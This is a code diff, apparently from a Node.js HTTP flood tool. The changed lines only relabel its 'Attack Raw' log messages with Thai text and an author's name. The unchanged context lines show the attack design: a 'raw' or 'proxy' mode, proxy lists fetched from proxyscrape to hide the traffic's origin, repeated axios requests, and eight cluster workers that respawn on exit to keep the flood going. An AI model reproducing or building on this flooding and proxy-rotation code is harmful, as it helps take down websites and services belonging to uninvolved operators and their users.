@@ -12,7 +12,7 @@ async function maintenance() {
   
   else{
     if (process.argv[3] == 'raw'){
-      console.log('axios Attack Raw')
+      console.log('axios อะฟุฟวย Chawit')
     }
     else if(process.argv[3] == 'proxy'){
       const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
@@ -34,9 +34,9 @@ async function maintenance() {
         }
       }
       axios(config).then(function (re){
-        console.log("Attack Raw",re.status)
+        console.log("อะฟุฟวย Chawit",re.status)
       }).catch(function (error){
-        console.log("Attack Raw ",error.response.status)
+        console.log("อะฟุฟวย Chawit ",error.response.status)
       })
     }
     else if(process.argv[3] == 'proxy'){
@@ -75,7 +75,7 @@ async function th(){
   if (cluster.isMaster){
     for (let u=0;u<8;u++){
       cluster.fork()
-      console.log('BY อะฟุ ฟวย')
+      console.log('BY อะฟุ ฟวย Chawit Manwong')
     }
     cluster.on('exit',function(){
       cluster.fork()
